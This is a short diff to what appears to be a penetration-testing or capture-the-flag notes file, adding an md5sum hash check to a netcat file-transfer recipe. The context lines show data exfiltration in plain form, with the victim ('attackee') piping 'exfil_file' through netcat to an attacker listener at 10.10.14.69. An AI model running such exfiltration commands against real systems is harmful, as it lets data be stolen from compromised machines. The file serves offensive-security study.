@@ -326,6 +326,9 @@ nc -lnvp 12345 > exfil_file
 
 # attackee:
 nc -q0 10.10.14.69 12345 < exfil_file
+
+# on both:
+md5sum exfil_file # and compare hashes to verify the transfer.
 ```
 
 * commands this can be useful for: `dd`, `tar` (tar pipe)
